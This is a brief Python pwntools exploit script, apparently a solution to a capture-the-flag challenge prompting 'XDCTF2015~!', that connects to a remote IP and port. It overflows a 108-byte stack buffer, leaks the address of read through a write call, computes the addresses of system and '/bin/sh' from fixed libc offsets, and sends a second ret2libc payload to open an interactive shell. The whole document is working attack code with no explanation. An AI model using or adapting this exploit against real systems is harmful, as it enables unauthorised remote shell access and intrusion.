from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

#t = remote('192.168.5.180', 9999)

t = remote('111.198.29.45', 42915)
addr_ret = 0x08048484
payload = cyclic(108) + p32(0xdeadbeef) + p32(0x80483c0) + p32(addr_ret) + p32(1) + p32(0x0804a004) + p32(4)



#raw_input()

t.sendlineafter('XDCTF2015~!\n', payload)


addr_read = u32(t.recv(4))
log.info('addr_read: ' + hex(addr_read))
addr_sys = addr_read - 0x000d4350 + 0x0003a940
addr_bin =  addr_read - 0x000d4350 + 0x15902b
payload2 = cyclic(108) + p32(0xdeadbeef) + p32(addr_sys) + p32(0) + p32(addr_bin) 
t.sendline(payload2)
t.interactive()
